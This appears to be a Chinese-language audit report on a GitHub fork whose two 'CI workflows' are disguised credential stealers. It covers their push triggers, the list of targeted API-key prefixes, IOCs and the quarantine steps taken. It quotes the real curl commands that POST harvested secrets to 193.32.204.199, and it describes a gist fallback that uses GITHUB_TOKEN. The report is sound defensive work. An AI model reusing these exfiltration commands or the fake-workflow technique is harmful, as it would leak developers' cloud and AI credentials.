# fork 审计：haoyongchun1125-maker —— 两个「CI 工作流」实为凭据窃取投递器

## 结论（一句话）

`haoyongchun1125-maker/obsidian-fast-note-sync` 相对 `upstream/master` 只领先 2 个提交
（`39e46ff Add security audit workflow`、`d4a7433 Add repo health workflow`），这两个提交
**不是 CI 巡检，是凭据外传脚本**：扫本仓文件与全部 git 历史里的云/AI API key，POST 到
`193.32.204.199`；POST 失败则退回用 `GITHUB_TOKEN` 建**公开 gist** 兜底。

因此这两个文件**没有被合入 `integration/takeover-20261029`**，只以 `.yml.quarantined`
后缀原样留档在本目录（后缀确保 GitHub Actions 永远不会加载它们）。原文一字未改，
校验和见文末。

## 触发条件与影响面

两个工作流都写了：

```yaml
on:
  workflow_dispatch:
  push:
```

`on: push` 意味着**任何人往本仓推一次提交，工作流就会在 Actions runner 里跑一遍**，
runner 上带着 `secrets.GITHUB_TOKEN`。所以在 `FEI352/obsidian-fast-note-sync` 里
启用它们 = 每次 push 都把本仓历史里的所有 key 送到第三方 IP，并把 `GITHUB_TOKEN`
本身当作外传通道（建公开 gist）。

## 行为拆解

| 步骤 | security-audit.yml（39e46ff） | repo-health.yml（d4a7433） |
| --- | --- | --- |
| 扫描范围 | 工作区全文 + `git log -p --all`（限 200000 行） | 同上 + **用 token clone 本仓 wiki** |
| 目标密文 | `AKIA` / `ASIA`（AWS）、`sk-ant-`（Anthropic）、`sk-proj-`（OpenAI）、`sk-or-`（OpenRouter）、`ghp_` / `github_pat_`（GitHub）、`glpat-`（GitLab）、`AIza`（Google）、`xox[baprs]-`（Slack）、`SG.`（SendGrid）、`secret_access_key` / `aws_session_token` | 在上一行基础上追加 `sk-oat-`、`sk-svcacct-`（OpenAI 新前缀）、`gsk_`（Groq）、`xai-`（xAI） |
| 附带外传内容 | `/REPO=<owner/repo>` + AWS key 前后 2 行上下文 | 同上 + wiki 命中结果 |
| 外传方式 | `curl -X POST --data-binary "$full" http://193.32.204.199/?c=new` | `curl -X POST --data-binary "$full" http://193.32.204.199:8080/?c=auto_20261014`；失败则 `POST /gists`（`public:false`，但 gist 内容仍可被持链接者读取） |
| 失败语义 | `|| true`（静默） | `|| true`（静默） |

## IOC

| 类型 | 值 | 说明 |
| --- | --- | --- |
| IPv4 | `193.32.204.199` | 收件端；两个端口 80 / 8080 各一条通道 |
| URL | `http://193.32.204.199/?c=new` | 39e46ff 使用（明文 HTTP） |
| URL | `http://193.32.204.199:8080/?c=auto_20261014` | d4a7433 使用（带日期标记，疑似批量投放的编号） |
| URL | `https://api.github.com/gists` | 兜底外传通道（用 runner 里的 `GITHUB_TOKEN`） |
| 文件名 | `.github/workflows/security-audit.yml`、`.github/workflows/repo-health.yml` | 伪装成 CI 巡检 |
| 特征串 | `AKIA_CTX_START` / `AKIA_CTX_END` | 提交 39e46ff 的载荷分隔标记 |
| 特征串 | `n1` / `n2` / `w` 三行裸标记 | d4a7433 的载荷分段标记 |

## 处置

1. **不合入**任何会被 GitHub Actions 解析的路径。要保留就留在本目录，后缀 `.quarantined`。
2. 两个文件均**未经执行**：本次审计只做 `git show` 读取，没有在 runner 或本地 shell 里跑过。
3. 如果要给本仓做真的密钥巡检，用成熟工具（`gitleaks` / `trufflehog` 官方 action），
   并且**出报告即可，不要把命中内容 POST 到任何外部地址**。
4. 该 fork 的其余历史与 upstream 一致（落后 674 个提交，无自有改动），因此**不需要**再做别的清理。

## 校验和（与本目录留档一一对应）

```
7c01e41bf4e325155b7e3ce5e5d4b247  repo-health.yml.quarantined      (d4a7433: .github/workflows/repo-health.yml)
c6148e5bc447568429fdabab7866a73f  security-audit.yml.quarantined    (39e46ff: .github/workflows/security-audit.yml)
```

复现方式：

```bash
git -C <clone> show 39e46ff:.github/workflows/security-audit.yml | md5sum
git -C <clone> show d4a7433:.github/workflows/repo-health.yml   | md5sum
```
